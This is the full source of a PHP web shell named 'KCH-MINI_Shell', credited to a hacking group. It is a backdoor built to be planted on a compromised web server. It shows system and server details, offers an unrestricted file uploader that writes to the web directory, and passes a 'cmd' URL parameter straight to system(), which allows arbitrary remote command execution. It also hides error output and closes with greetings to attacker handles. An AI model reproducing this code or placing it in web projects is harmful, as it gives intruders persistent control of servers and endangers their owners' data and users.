<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <style>
    	.head { color: red }
    </style>

    <title>KCH-MINI_Shell</title>
    <?php error_reporting(0);?>
  </head>

  <body style="background:  #5a0109 ">
  	<br>
  	<div class="container" style="background: black;border-style: ridge; border-color:white;border-radius: 20px">
  		<br>
    <div class="container head">
    	<marquee> <h1 class="text-center" style="color:  #55ff00 ">KOLKATA_CYBER_HEROES      Shell made by DIBO237#</h1></marquee><br>
    <p2>System Info:<font color=" #55ff00 "> <?php echo php_uname(); ?></font></p2><br>
    <p2>USer:<font color=" #55ff00 ">   <?php echo @get_current_user(); ?></font></p2><br>
    <p2>Clint_IP:<font color=" #55ff00 ">   <?php echo $_SERVER['REMOTE_ADDR']; ?></font></p2><br>
    <p2>Server_IP:<font color=" #55ff00 ">   <?php echo $_SERVER['SERVER_ADDR']; ?></font></p2><br>
    <p2>Server_Soft:<font color=" #55ff00 ">  <?php echo $_SERVER['SERVER_SOFTWARE']; ?></font></p2><br>
    <p2>Curent_Path:<font color=" #55ff00 ">  <?php echo getcwd(); ?></font></p2>
    </div>
  <br>
</div><br>
<div class="container " style="background: black;border-style: ridge; border-color:white;border-radius: 20px"><br>
	<div class="container"><br>
		<img  src="http://therokzz.epizy.com/kch.png" width="220" class="rounded mx-auto d-block" alt="...">
		<div class="container"><div class="container">


</div>
  <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
  </body>
</html>

<?php
$files = @$_FILES["files"];
if ($files["name"] != '') {
    $fullpath =  $files["name"];
    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
        echo "<center><h1><a href='$fullpath'>Click-here-to-access-the-file!!</a></h1></center>";
    }
}echo '<html>
<body>
<div class="container">
<center>
<h1 style="color: #55ff00 ">Uploader!!</h1><br>
<form method=POST enctype="multipart/form-data" action="">
<input style="background: red" type="file" name="files">
<input type=submit value="Up">
</form>
</center><div><br>
</body>
</html>';
?>		

<HTML><BODY><center><br><h2 style="color:  #55ff00 ">Ececute_Shell_Cmd!!<h2>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM></center>
<pre style="color: #55ff00">
<?
if($_GET['cmd']) {
  system($_GET['cmd']);
  }
?>
</pre>
</BODY></HTML>
<footer class="footer" style="background: black; color:  #55ff00 ; border-style: ridge;border-color: white"> <div class="footer-copyright text-center py-3"><marquee><h3> Grettings to: S4NJ1B-H4X0R , VILL377 , SPYDER , CopyCat, DIBO237#</h3></marquee>
  </div></footer><br>
